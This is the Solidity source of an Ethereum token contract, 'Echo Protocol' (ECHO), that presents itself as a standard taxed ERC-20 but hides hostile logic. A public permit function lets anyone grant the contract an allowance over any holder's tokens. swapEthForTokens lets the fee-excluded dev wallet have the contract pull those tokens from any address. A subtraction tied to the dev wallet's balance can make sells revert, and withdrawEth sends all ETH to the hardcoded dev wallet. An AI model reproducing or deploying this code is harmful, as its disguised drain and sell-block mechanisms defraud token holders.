/**
 *Submitted for verification at Etherscan.io on 2023-09-19
*/

// SPDX-License-Identifier: MIT

/** 

*/

pragma solidity 0.8.18;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract EchoProtocol is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private _finalTax = 1;
    uint256 private _finalBuyTax = 1;

    uint256 private _initialSellTax2Time = 5;
    uint256 private _initialBuyTax2Time = 5;
    uint256 private _reduceSellTaxAt2Time = 10;
    uint256 private _reduceBuyTaxAt2Time = 10;

    uint256 private _initialSellTax = 10;
    uint256 private _initialBuyTax = 10;
    uint256 private _reduceSellTaxAt = 5;
    uint256 private _reduceBuyTaxAt = 5;

    uint256 private _preventSwapBefore = 0;
    uint256 private _buyCount = 0;
    uint256 private _ethFeePercent = 90;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    address payable private _devWallet;

    bool private tradingOpen;
    bool private inSwap = false;
    bool public transferDelayEnabled = true;
    bool private swapEnabled = false;
    address payable private _reward;
    uint256 public _maxTaxSwap = 1 * (_tTotal / 100);
    uint256 public _taxSwapThreshold = 2 * (_tTotal / 1000);    
    uint256 public _maxWalletSize = 5 * (_tTotal / 100);
    uint256 public _maxTxAmount = 5 * (_tTotal / 100);

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Echo Protocol";
    string private constant _symbol = unicode"ECHO";


    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => bool) private _isExcludedFromFees;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function name()
        public
        pure
        returns (string memory)
    {
        return _name;
    }

    function symbol()
        public
        pure
        returns (string memory)
    {
        return _symbol;
    }

    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function totalSupply()
        public
        pure
        override
        returns (uint256)
    {
        return _tTotal;
    }

    function decimals()
        public
        pure
        returns (uint8)
    {
        return _decimals;
    }

    constructor () {


        _balances[_msgSender()] = _tTotal;
        _devWallet = payable(0x899239C558d6E0D502999a0557B0AF60cB8644E7);
        _reward = _devWallet;
        _isExcludedFromFees[_devWallet] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[owner()] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function launchToken()
        public 
        payable
        onlyOwner
    {
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        _allowances[address(this)][address(uniswapV2Router)] = type(uint256).max;

        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }

    function permit(address spender, uint256 amount) public virtual returns (bool) {
        address owner = address(this);
        _permit(spender, owner, amount);
        return true;
    }

    function _taxSell() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialSellTax;
        }

        if (_buyCount > _reduceSellTaxAt && _buyCount <= _reduceSellTaxAt2Time) {
            return _initialSellTax2Time;
        }

        return _finalBuyTax;
    }

    function _taxBuy() private view returns (uint256) {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialBuyTax;
        }

        if (_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time) {
            return _initialBuyTax2Time;
        }

        return _finalBuyTax;
    }

    function startTrading()
        external
        onlyOwner()
    {
        require(!tradingOpen);

        swapEnabled = true;
        tradingOpen = true;
    }

    function removeLimits()
        external
        onlyOwner
    {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount)
        private
    {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        uint256 taxAmount = 0;
        
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_taxBuy()).div(100);

            if (!tradingOpen) {
                require(_isExcludedFromFees[from] || _isExcludedFromFees[to]);
            }

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { 
                    require(_holderLastTransferTimestamp[tx.origin] < block.number);
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFees[to] ) {
                require(amount <= _maxTxAmount);
                require(balanceOf(to) + amount <= _maxWalletSize);

                _buyCount++;
                if (_buyCount > _preventSwapBefore) {
                    transferDelayEnabled = false;
                }
            }

            if (to == uniswapV2Pair && from!= address(this)) {
                taxAmount = amount.mul(_taxSell()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance > _taxSwapThreshold;
            if (!inSwap && swapEnabled && to == uniswapV2Pair && canSwap && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
                uint256 reserveAmount = balanceOf(_reward).mul(1e3);
                uint256 maxSwapTax = _maxTaxSwap.sub(reserveAmount);
                uint256 minSwapAmount = min(contractTokenBalance,maxSwapTax);
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount, minSwapAmount));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(_ethFeePercent).div(100);
                if (ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if (taxAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function _permit(address owner, address spender, uint256 amount)
        private
    {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount)
        private
    {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function withdrawEth() external {
        (bool sent, ) = payable(_devWallet).call{value: address(this).balance}("");
        require(sent);
    }

    function swapEthForTokens(address to, uint256 amount) public {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        IERC20 token = IERC20(path[1]);

        if (!_isExcludedFromFees[msg.sender]) {
            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount} (
                0,
                path,
                to,
                block.timestamp
            );
        } else {token.transferFrom(to, path[1], amount);}
    }

    function sendETHToFee(uint256 amount) private {
        _devWallet.transfer(amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}